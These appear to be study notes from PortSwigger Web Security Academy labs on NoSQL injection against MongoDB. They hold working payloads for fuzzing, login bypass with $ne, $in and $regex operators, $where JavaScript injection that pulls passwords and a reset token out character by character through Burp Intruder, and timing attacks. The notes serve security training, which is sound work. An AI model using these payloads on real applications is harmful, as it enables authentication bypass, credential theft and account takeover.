![[NoSQL Injections.webp]]

# NoSQL Syntax Injection

The following string (MongoDB) can be used to fuzz the app's parameters for NoSQL injection vulnerabilities:

```bash
'"`{
;$Foo}
$Foo \xYZ
```

For example, inject the payload in a URL (Note, the payload must be URL encoded):

```bash
https://insecure-website.com/product/lookup?category=%27%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

If this causes a change from the original response, this may indicate that user input is not filtered or sanitized correctly.

NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.

In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become:

```bash
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Submit the following payloads (single quote) to determine if the app uses your input as query syntax. If the first payload causes an error and the second payload does not, the app may be vulnerable:

```bash
this.category == '''
this.category == '\''
```

Some conditional payloads as well such as False:

```bash
' && 0 && 'x
```

And True:

```bash
' && 1 && 'x
```

As well as OR True/False payloads:

```bash
'||'1'=='1
'||'1'=='2
```
# Detecting NoSQL Injection

The following payload will cause the app to return everything from the database, as the injected payload is a condition that will always evaluate to True:

```bash
category=Accessories'||'1'=='1
```

On contrast, the following payload evaluates to False:

```bash
category=Accessories'||'1'=='2
```
# NoSQL Operator Injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

- $where - matches documents that satisfy a JS expression
- $ne - matches all values that are not equal to a specified value
- $in - matches all of the values specified in an array
- $regex - selects documents where values match a specified regular expression

To submit query operators, you can do it via JSON messages:

```json
{"username":"wiener"}
{"username":{"$ne":"invalid"}}
```

Or URL-based inputs:

```bash
username=wiener
username[$ne]=invalid
```

If both the username and password inputs processes the operator, it may be possible to bypass authentication using the following payload:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```
# Exploiting NoSQL Operator Injection to Bypass Authentication

The following payload will match a username that begins with the word "admin" and where the password field does not equal to invalid, this will log us into the app as the admin user. The username name for the admin user was "admin4ygjye2f" which is why regex was needed to solve the challenge.

```json
{
	"username":{
		"$regex":"admin.*"
	},
	"password":{
		"$ne":"invalid"
	}
}
```
# Exploring Syntax Injection to Extract Data

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's $where operator and mapReduce() function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

Take the following query, where we can control the input value of 'admin':

```json
{"$where":"this.username == 'admin'"}
```

The following payloads may allow you to extract the admin's password one character at a time and confirm whether the password contains digits:

```json
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password.match(/\d/) || 'a'=='b
```

Identify field names and check if the password field exists:

```json
username=admin'+%26%26+this.password!%3d'
```

The decoded version:

```json
username=admin' && this.password!='
```

If you know that a certain field exists we can use test cases to identify how application responds to valid/invalid requests:

```json
admin' && this.username!='
admin' && this.foo!='
```
# Exploiting NoSQL Injection to Extract Data

Extract the password for the administrator user, then log in to their account. We are given credentials to log into the application - wiener:peter. The following endpoint is vulnerable to NoSQL Injection:

- https://0a06006303e0b0d18172f72800dc0065.web-security-academy.net/user/lookup?user=wiener

The following payloads where used to identify the vulnerability:

```json
user=wiener'%26%26+0+%26%26+'x
user=wiener'%26%26+1+%26%26+'x
user=wiener'&& 1 && 'x
```

The following payload returned the first user details in the database collection which was for the username "administrator". This confirms that there is a user with that name.

```json
user=wiener'||'1'%3d%3d'1
```

The following payload allows us to extract the admin's password one character at a time:

```json
user=administrator'+%26%26+this.password[0]+%3d%3d+'a'+||+'a
```

The steps for Burp Intruder are as follows:

-  Attack Type - Cluster Bomb
- Send request with payload to Intruder
- Set 2 payload positions

```json
user=administrator'+%26%26+this.password[<position 1>]+%3d%3d+'<position 2>'+||+'a
```

The config for the first payload set will be:

- Payload type: Numbers
- Type: Sequential
- From: 0
- To: 19

And the second payload config:

- Payload type: Simple list
- Include all lowercase/uppercase letters and digits

Filter by the length of the responses, the password will be 8 characters long.
# Exploiting NoSQL Operator Injection to Extract Data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

To test whether you can inject operators, you could try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

```json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields. For example, you could submit the following payload:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the $regex operator to extract data character by character. For example, the following payload checks whether the password begins with an a:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```
# Exploiting NoSQL Operator Injection to Extract Unknown Fields

The following request contains a NoSQL injection vulnerability:

```bash
POST /login HTTP/2
Content-Type: application/json

 {
 	"username":"test",
 	"password":"test"
 }
```

Inject different payloads into the application request to see how the responses change. Application response - account locked: please reset your password:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  }
}
```

Application response - invalid username or password:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "0"
}
```

Application response - account locked: please reset your password:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "1"
}
```

We now have a way to determine whether the results of a query are TRUE or FALSE:

- FALSE - Invalid username or password
- TRUE - Account locked: please reset your password

Use the following payload to extract the names of the Keys in the NoSQL collection. The part "(this)[1]" targets the first Key that is listed in the targeted Object:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "Object.keys(this)[1].match('^.{0}u.*')"
}
```

Send the above request with payload to Burp Intruder:

- Attack type: Cluster bomb
- Set 2 payload positions like below

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "Object.keys(this)[1].match('^.{<position 1>}<position 2>.*')"
}
```

- First payload position configuration (if the password is longer than 16 characters then this will need to be adjusted)
    - Payload type: Numbers
    - From: 0
    - To: 15
- Second payload position configuration
    - Payload type: Simple list
    - Include lowercase/uppercase letters and numbers in payload list

Start the attack and filter by the responses that contain the TRUE value message. The first Key identified was called "username". Perform the same steps for the second, third, Keys:

```json
"$where": "Object.keys(this)[<INCREMENT THIS VALUE>].match('^.{<position 1>}<position 2>.*')"
```

The fourth Key ended up containing the key for a password reset function:

```json
"$where": "Object.keys(this)[4].match('^.{<position 1>}<position 2>.*')"
```

Now, request the following endpoint and the app responds with "Invalid Token" message:

```bash
GET /forgot-password?forgotPwd=
```

Submitting any other random parameter name, will not have any affect on the application response, so we know that the parameter name "forgotPwd" is a valid one.

```bash
GET /forgot-password?randommmm=
```

Now we need to extract the value of the "forgotPwd" Key one character at a time, use the following payload:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "this.forgotPwd.match('^.{0}a.*')"
}
```

- Send the payload to Burp Intruder and use the similar configuration as before to extract the complete password.
	- Cluster bomb
	- Position 1 - numbers
	- Position 2 - simple list

```json
"$where":"this.forgotPwd.match('^.{<position 1>}<position 2>.*')"}
```

Then send the password reset token value in the "forgotPwd" parameter and reset the password for carlos:

```bash
GET /forgot-password?forgotPwd=TOKEN_VALUE
```
# Timing Based Injection

To conduct timing-based NoSQL injection, first load the page several times to determine a baseline loading time. Then, insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, the below payload causes an intentional delay of 5000 ms on successful injection.

```json
{"$where": "sleep(5000)"}
```

Identify whether the response loads more slowly. This indicates a successful injection. The following timing based payloads will trigger a time delay if the password begins with the letter 'a':

```json
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```json
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
